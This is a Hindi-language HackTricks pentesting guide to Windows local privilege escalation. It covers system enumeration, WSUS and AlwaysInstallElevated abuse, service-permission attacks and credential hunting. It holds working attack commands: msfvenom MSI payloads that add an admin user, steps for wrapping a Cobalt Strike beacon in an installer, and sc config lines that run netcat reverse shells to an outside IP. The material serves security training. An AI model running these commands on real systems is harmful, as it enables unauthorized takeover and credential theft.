# Windows स्थानीय विशेषाधिकार वृद्धि

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे**? या क्या आप **PEASS के नवीनतम संस्करण तक पहुँचना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram समूह**](https://t.me/peass) में या **Twitter** पर मुझे **फॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपनी हैकिंग ट्रिक्स साझा करें, [**hacktricks repo**](https://github.com/carlospolop/hacktricks) और [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) में PRs सबमिट करके.**

</details>

### **Windows स्थानीय विशेषाधिकार वृद्धि के लिए सर्वोत्तम उपकरण:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारंभिक Windows सिद्धांत

### एक्सेस टोकन

**यदि आपको नहीं पता कि Windows एक्सेस टोकन क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**

{% content-ref url="access-tokens.md" %}
[access-tokens.md](access-tokens.md)
{% endcontent-ref %}

### ACLs - DACLs/SACLs/ACEs

**यदि आपको इस खंड के शीर्षक में प्रयुक्त किसी भी संक्षिप्त नाम का अर्थ नहीं पता है, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें**:

{% content-ref url="acls-dacls-sacls-aces.md" %}
[acls-dacls-sacls-aces.md](acls-dacls-sacls-aces.md)
{% endcontent-ref %}

### अखंडता स्तर

**यदि आपको नहीं पता कि Windows में अखंडता स्तर क्या हैं, तो जारी रखने से पहले निम्नलिखित पृष्ठ पढ़ें:**

{% content-ref url="integrity-levels.md" %}
[integrity-levels.md](integrity-levels.md)
{% endcontent-ref %}

## Windows सुरक्षा नियंत्रण

Windows में विभिन्न चीजें हैं जो **आपको सिस्टम का अनुक्रमण करने से रोक सकती हैं**, एक्जीक्यूटेबल्स चलाने या यहां तक कि **आपकी गतिविधियों का पता लगाने से रोक सकती हैं**। आपको निम्नलिखित **पृष्ठ** पढ़ना चाहिए और विशेषाधिकार वृद्धि के अनुक्रमण शुरू करने से पहले इन सभी **रक्षा** **तंत्रों** का **अनुक्रमण** करना चाहिए:

{% content-ref url="../authentication-credentials-uac-and-efs.md" %}
[authentication-credentials-uac-and-efs.md](../authentication-credentials-uac-and-efs.md)
{% endcontent-ref %}

## सिस्टम जानकारी

### संस्करण जानकारी अनुक्रमण

जाँचें कि Windows संस्करण में कोई ज्ञात कमजोरी है या नहीं (लागू पैचों की भी जाँच करें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### संस्करण दोषों का लाभ उठाना

यह [साइट](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा दोषों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा दोष हैं, जो दिखाते हैं कि एक Windows वातावरण **विशाल हमले की सतह** प्रस्तुत करता है।

**सिस्टम पर**

* _post/windows/gather/enum\_patches_
* _post/multi/recon/local\_exploit\_suggester_
* [_watson_](https://github.com/rasta-mouse/Watson)
* [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson शामिल है)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

* [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
* [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**दोषों का लाभ उठाने वाले Github रेपोज:**

* [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
* [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
* [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### पर्यावरण

क्या कोई प्रमाणपत्र/रसदार जानकारी env चर में सहेजी गई है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फाइलें

आप इसे कैसे चालू करें, यह जानने के लिए [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) पर जाएं।
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell मॉड्यूल लॉगिंग

यह PowerShell के पाइपलाइन निष्पादन का विवरण रिकॉर्ड करता है। इसमें निष्पादित किए गए आदेश शामिल होते हैं जिसमें आदेश आह्वान और स्क्रिप्ट्स का कुछ भाग शामिल होता है। इसमें निष्पादन का पूरा विवरण और आउटपुट परिणाम नहीं हो सकता है।\
आप इसे पिछले अनुभाग के लिंक का अनुसरण करके सक्षम कर सकते हैं (Transcript files) लेकिन "Powershell Transcription" के बजाय "Module Logging" को सक्षम करके।
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell लॉग्स से अंतिम 15 घटनाओं को देखने के लिए आप निम्नलिखित कमांड निष्पादित कर सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **स्क्रिप्ट ब्लॉक लॉगिंग**

यह कोड के ब्लॉक को उनके निष्पादित होने के समय रिकॉर्ड करता है इसलिए यह स्क्रिप्ट की पूरी गतिविधि और पूरी सामग्री को कैप्चर करता है। यह प्रत्येक गतिविधि का पूरा ऑडिट ट्रेल बनाए रखता है जिसका उपयोग बाद में फोरेंसिक्स में और दुर्भावनापूर्ण व्यवहार का अध्ययन करने में किया जा सकता है। यह निष्पादन के समय सभी गतिविधि को रिकॉर्ड करता है इस प्रकार पूरी जानकारी प्रदान करता है।
```
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
स्क्रिप्ट ब्लॉक लॉगिंग इवेंट्स को विंडोज इवेंट व्यूअर में निम्नलिखित पथ के अंतर्गत पाया जा सकता है: _एप्लिकेशन और सेवाएं लॉग्स > माइक्रोसॉफ्ट > विंडोज > पॉवरशेल > ऑपरेशनल_\
पिछले 20 इवेंट्स को देखने के लिए आप इसका उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http का उपयोग करके नहीं बल्कि http**S** का उपयोग करके अनुरोधित नहीं किए जाते हैं, तो आप सिस्टम को समझौता कर सकते हैं।

आप यह जांचने के लिए शुरू करते हैं कि क्या नेटवर्क एक नॉन-SSL WSUS अपडेट का उपयोग करता है, निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
यदि आपको इस तरह का उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
और यदि `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` का मान `1` के बराबर है।

तब, **यह शोषण योग्य है।** यदि अंतिम रजिस्ट्री का मान 0 के बराबर है, तो, WSUS प्रविष्टि को अनदेखा किया जाएगा।

इन कमजोरियों का शोषण करने के लिए आप उपकरणों का उपयोग कर सकते हैं जैसे: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS](https://github.com/GoSecure/pywsus) - ये MiTM हथियारबंद शोषण स्क्रिप्ट हैं जो 'नकली' अपडेट्स को गैर-SSL WSUS ट्रैफिक में इंजेक्ट करते हैं।

शोध यहाँ पढ़ें:

{% file src="../../.gitbook/assets/CTX_WSUSpect_White_Paper (1).pdf" %}

**WSUS CVE-2020-1013**

[**पूरी रिपोर्ट यहाँ पढ़ें**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
मूल रूप से, यह वह दोष है जिसका यह बग शोषण करता है:

> यदि हमारे पास अपने स्थानीय उपयोगकर्ता प्रॉक्सी को संशोधित करने की शक्ति है, और Windows Updates इंटरनेट एक्सप्लोरर की सेटिंग्स में कॉन्फ़िगर की गई प्रॉक्सी का उपयोग करता है, तो हमारे पास अपने स्वयं के ट्रैफिक को इंटरसेप्ट करने और हमारी संपत्ति पर एक उच्च उपयोगकर्ता के रूप में कोड चलाने के लिए स्थानीय रूप से [PyWSUS](https://github.com/GoSecure/pywsus) चलाने की शक्ति है।
>
> इसके अलावा, चूंकि WSUS सेवा वर्तमान उपयोगकर्ता की सेटिंग्स का उपयोग करती है, यह उसके सर्टिफिकेट स्टोर का भी उपयोग करेगी। यदि हम WSUS होस्टनेम के लिए एक स्व-हस्ताक्षरित सर्टिफिकेट जनरेट करते हैं और इस सर्टिफिकेट को वर्तमान उपयोगकर्ता के सर्टिफिकेट स्टोर में जोड़ते हैं, तो हम HTTP और HTTPS WSUS ट्रैफिक दोनों को इंटरसेप्ट करने में सक्षम होंगे। WSUS में HSTS जैसी कोई तंत्र नहीं है जो सर्टिफिकेट पर एक विश्वास-पर-पहली-उपयोग प्रकार का मान्यता लागू करती है। यदि प्रस्तुत सर्टिफिकेट उपयोगकर्ता द्वारा विश्वसनीय है और उसके पास सही होस्टनेम है, तो यह सेवा द्वारा स्वीकार किया जाएगा।

आप इस कमजोरी का शोषण [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) उपकरण का उपयोग करके कर सकते हैं (एक बार जब यह मुक्त हो जाता है)।

## KrbRelayUp

यह मूल रूप से एक सार्वभौमिक नो-फिक्स **स्थानीय विशेषाधिकार वृद्धि** है विंडोज **डोमेन** वातावरण में जहां **LDAP हस्ताक्षर को लागू नहीं किया गया है,** जहां **उपयोगकर्ता के पास स्वयं के अधिकार हैं** (कॉन्फ़िगर **RBCD** करने के लिए) और जहां **उपयोगकर्ता डोमेन में कंप्यूटर बना सकता है।**\
सभी **आवश्यकताएँ** **डिफ़ॉल्ट सेटिंग्स** के साथ पूरी की जाती हैं।

**शोषण को यहाँ पाएं** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

यदि हमला के प्रवाह के बारे में अधिक जानकारी के लिए देखें [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**यदि** ये 2 रजिस्टर **सक्षम** हैं (मान **0x1** है), तो किसी भी विशेषाधिकार के उपयोगकर्ता `*.msi` फाइलों को NT AUTHORITY\\**SYSTEM** के रूप में **स्थापित** (निष्पादित) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit पेलोड्स
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
```markdown
यदि आपके पास meterpreter सत्र है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

Power-up से `Write-UserAddMSI` कमांड का उपयोग करके वर्तमान डायरेक्टरी में एक Windows MSI बाइनरी बनाएं जो विशेषाधिकार बढ़ाने के लिए हो। यह स्क्रिप्ट एक पूर्व-संकलित MSI इंस्टॉलर लिखती है जो उपयोगकर्ता/समूह जोड़ने के लिए संकेत देती है (इसलिए आपको GIU पहुँच की आवश्यकता होगी):
```
```
Write-UserAddMSI
```
निर्मित बाइनरी को निष्पादित करके विशेषाधिकार बढ़ाएं।

### MSI रैपर

इस टूल्स का उपयोग करके MSI रैपर कैसे बनाएं, इसके लिए इस ट्यूटोरियल को पढ़ें। ध्यान दें कि यदि आप केवल **कमांड लाइन्स** **निष्पादित** करना चाहते हैं तो आप एक "**.bat**" फाइल को रैप कर सकते हैं।

{% content-ref url="msi-wrapper.md" %}
[msi-wrapper.md](msi-wrapper.md)
{% endcontent-ref %}

### WIX के साथ MSI बनाएं

{% content-ref url="create-msi-with-wix.md" %}
[create-msi-with-wix.md](create-msi-with-wix.md)
{% endcontent-ref %}

### विजुअल स्टूडियो के साथ MSI बनाएं

* Cobalt Strike या Metasploit के साथ `C:\privesc\beacon.exe` में एक **नया Windows EXE TCP पेलोड** **जनरेट** करें।
* **विजुअल स्टूडियो** खोलें, **Create a new project** चुनें और सर्च बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट को चुनें और **Next** पर क्लिक करें।
* प्रोजेक्ट को एक नाम दें, जैसे कि **AlwaysPrivesc**, स्थान के लिए **`C:\privesc`** का उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
* **Next** पर क्लिक करते रहें जब तक आप चरण 3 के 4 (शामिल करने के लिए फाइलें चुनें) तक नहीं पहुंच जाते। **Add** पर क्लिक करें और अभी जनरेट किए गए Beacon पेलोड को चुनें। फिर **Finish** पर क्लिक करें।
* **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में, **TargetPlatform** को **x86** से **x64** में बदलें।
* अन्य प्रॉपर्टीज हैं जिन्हें आप बदल सकते हैं, जैसे कि **Author** और **Manufacturer** जो इंस्टॉल किए गए ऐप को अधिक वैध दिखा सकते हैं।
* प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
* **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
* **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फाइल को चुनें और **OK** पर क्लिक करें। यह सुनिश्चित करेगा कि बीकन पेलोड इंस्टॉलर चलाने के तुरंत बाद निष्पादित हो जाए।
* **Custom Action Properties** के अंतर्गत, **Run64Bit** को **True** में बदलें।
* अंत में, **इसे बिल्ड करें**।
* यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई देती है, तो सुनिश्चित करें कि आपने प्लेटफॉर्म को x64 पर सेट किया है।

### MSI इंस्टॉलेशन

दुर्भावनापूर्ण `.msi` फाइल का **इंस्टॉलेशन** **पृष्ठभूमि में** निष्पादित करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस कमजोरी का फायदा उठाने के लिए आप इसका उपयोग कर सकते हैं: _exploit/windows/local/always\_install\_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि लॉग्स कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** आपको डोमेन-जुड़े कंप्यूटरों पर स्थानीय Administrator पासवर्ड **प्रबंधित करने** की अनुमति देता है (जो **रैंडमाइज्ड**, अद्वितीय, और **नियमित रूप से बदला जाता है**). ये पासवर्ड्स केंद्रीय रूप से Active Directory में संग्रहीत किए जाते हैं और ACLs का उपयोग करके अधिकृत उपयोगकर्ताओं तक सीमित होते हैं। यदि आपके उपयोगकर्ता को पर्याप्त अनुमतियां दी गई हैं, तो आप स्थानीय एडमिन्स के पासवर्ड्स पढ़ सकते हैं।

{% content-ref url="../active-directory-methodology/laps.md" %}
[laps.md](../active-directory-methodology/laps.md)
{% endcontent-ref %}

### WDigest

यदि सक्रिय है, **प्लेन-टेक्स्ट पासवर्ड्स LSASS में संग्रहीत किए जाते हैं** (Local Security Authority Subsystem Service).\
[**WDigest के बारे में अधिक जानकारी इस पेज पर**](../stealing-credentials/credentials-protections.md#wdigest).
```
reg query HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential
```
### LSA सुरक्षा

Microsoft ने **Windows 8.1 और बाद के संस्करणों** में LSA के लिए अतिरिक्त सुरक्षा प्रदान की है ताकि अविश्वसनीय प्रक्रियाएं इसकी मेमोरी को **पढ़ने** या कोड इंजेक्ट करने से **रोक** सकें।\
[**LSA सुरक्षा के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#lsa-protection).
```
reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL
```
### क्रेडेंशियल्स गार्ड

**क्रेडेंशियल्स गार्ड** Windows 10 (एंटरप्राइज और एजुकेशन संस्करण) में एक नई सुविधा है जो आपके मशीन पर क्रेडेंशियल्स की सुरक्षा करती है, जैसे कि pass the hash से खतरों से।\
[**क्रेडेंशियल्स गार्ड के बारे में अधिक जानकारी यहाँ।**](../stealing-credentials/credentials-protections.md#credential-guard)
```
reg query HKLM\System\CurrentControlSet\Control\LSA /v LsaCfgFlags
```
### कैश्ड क्रेडेंशियल्स

**डोमेन क्रेडेंशियल्स** का उपयोग ऑपरेटिंग सिस्टम के कॉम्पोनेंट्स द्वारा किया जाता है और इन्हें **लोकल** **सिक्योरिटी अथॉरिटी** (LSA) द्वारा **प्रमाणित** किया जाता है। आमतौर पर, डोमेन क्रेडेंशियल्स एक यूजर के लिए स्थापित किए जाते हैं जब एक पंजीकृत सिक्योरिटी पैकेज यूजर के लॉगऑन डेटा को प्रमाणित करता है।\
[**कैश्ड क्रेडेंशियल्स के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूह की गणना करें

आपको जांचना चाहिए कि क्या आपके द्वारा संबंधित किसी भी समूह में दिलचस्प अनुमतियां हैं
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार प्राप्त समूह

यदि आप **किसी विशेषाधिकार प्राप्त समूह के सदस्य हैं, तो आप विशेषाधिकार बढ़ा सकते हैं**। विशेषाधिकार प्राप्त समूहों के बारे में जानें और यहाँ उनका दुरुपयोग करके विशेषाधिकार कैसे बढ़ाएं:

{% content-ref url="../active-directory-methodology/privileged-groups-and-token-privileges.md" %}
[privileged-groups-and-token-privileges.md](../active-directory-methodology/privileged-groups-and-token-privileges.md)
{% endcontent-ref %}

### टोकन मैनिपुलेशन

इस पृष्ठ पर **और जानें** कि **टोकन** क्या है: [**Windows टोकन**](../authentication-credentials-uac-and-efs.md#access-tokens).\
निम्नलिखित पृष्ठ पर जाकर **रोचक टोकनों के बारे में जानें** और उनका दुरुपयोग कैसे करें:

{% content-ref url="privilege-escalation-abusing-tokens/" %}
[privilege-escalation-abusing-tokens](privilege-escalation-abusing-tokens/)
{% endcontent-ref %}

### लॉग इन किए गए उपयोगकर्ता / सत्र
```
qwinsta
klist sessions
```
### होम फोल्डर्स
```
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रही प्रक्रियाएं

### फ़ाइल और फ़ोल्डर अनुमतियां

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया की कमांड लाइन में पासवर्ड की जांच करें**।\
जांचें कि क्या आप **किसी चल रहे बाइनरी को ओवरराइट कर सकते हैं** या बाइनरी फ़ोल्डर की लिखने की अनुमतियां हैं ताकि संभावित [**DLL Hijacking हमलों**](dll-hijacking.md) का लाभ उठाया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium डिबगर्स** की जाँच करें, आप इसका दुरुपयोग करके विशेषाधिकार बढ़ा सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रक्रियाओं के बाइनरीज की अनुमतियों की जाँच करना**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रक्रियाओं के बाइनरीज़ के फोल्डर्स की अनुमतियाँ जांचना (**[**DLL Hijacking**](dll-hijacking.md)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### मेमोरी पासवर्ड माइनिंग

आप सिसइंटरनल्स से **procdump** का उपयोग करके चल रही प्रक्रिया का मेमोरी डंप बना सकते हैं। सेवाएं जैसे कि FTP में **मेमोरी में स्पष्ट पाठ में क्रेडेंशियल्स होते हैं**, मेमोरी डंप करने की कोशिश करें और क्रेडेंशियल्स पढ़ें।
```
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चल रहे ऐप्लिकेशन्स एक उपयोगकर्ता को CMD खोलने या डायरेक्टरीज़ ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" के लिए खोजें, "Click to open Command Prompt" पर क्लिक करें

## सेवाएँ

सेवाओं की सूची प्राप्त करें:
```
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियां

आप सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```
sc qc <service_name>
```
यह सिफारिश की जाती है कि _Sysinternals_ से **accesschk** बाइनरी का उपयोग करें ताकि प्रत्येक सेवा के लिए आवश्यक विशेषाधिकार स्तर की जांच की जा सके।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह सिफारिश की जाती है कि जांचें कि क्या "Authenticated Users" किसी भी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप accesschk.exe for XP यहाँ से डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि आ रही है (उदाहरण के लिए SSDPSRV के साथ):

_सिस्टम त्रुटि 1058 आ गई है।_\
_सेवा प्रारंभ नहीं की जा सकती, या तो इसे अक्षम किया गया है या इसके साथ जुड़े सक्षम उपकरण नहीं हैं।_

आप इसे सक्षम कर सकते हैं उपयोग करके
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान दें कि upnphost सेवा काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या का एक और समाधान** यह है कि चलाएं:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पथ में परिवर्तन**

यदि "Authenticated users" समूह को किसी सेवा में **SERVICE\_ALL\_ACCESS** की अनुमति प्राप्त है, तो वह सेवा द्वारा निष्पादित की जा रही बाइनरी को संशोधित कर सकता है। **nc** को निष्पादित करने और इसे संशोधित करने के लिए आप यह कर सकते हैं:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनः आरंभ करें
```
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
अन्य अनुमतियाँ जिनका उपयोग विशेषाधिकार बढ़ाने के लिए किया जा सकता है:\
**SERVICE\_CHANGE\_CONFIG** सेवा बाइनरी को पुनः कॉन्फ़िगर कर सकते हैं\
**WRITE\_DAC:** अनुमतियों को पुनः कॉन्फ़िगर कर सकते हैं, जिससे SERVICE\_CHANGE\_CONFIG हो सकता है\
**WRITE\_OWNER:** मालिक बन सकते हैं, अनुमतियों को पुनः कॉन्फ़िगर कर सकते हैं\
**GENERIC\_WRITE:** SERVICE\_CHANGE\_CONFIG को विरासत में मिलता है\
**GENERIC\_ALL:** SERVICE\_CHANGE\_CONFIG को विरासत में मिलता है

**इस संवेदनशीलता का पता लगाने और उपयोग करने के लिए** आप _exploit/windows/local/service\_permissions_ का उपयोग कर सकते हैं

### सेवाओं की बाइनरीज में कमजोर अनुमतियाँ

**जांचें कि क्या आप उस बाइनरी को संशोधित कर सकते हैं जो किसी सेवा द्वारा निष्पादित की जाती है** या यदि आपके पास उस फ़ोल्डर पर **लिखने की अनुमति है** जहाँ बाइनरी स्थित है ([**DLL Hijacking**](dll-hijacking.md))**.**\
आप **wmic** का उपयोग करके हर बाइनरी प्राप्त कर सकते हैं जो किसी सेवा द्वारा निष्पादित की जाती है (system32 में नहीं) और अपनी अनुमतियों की जांच **icacls** का उपयोग करके कर सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

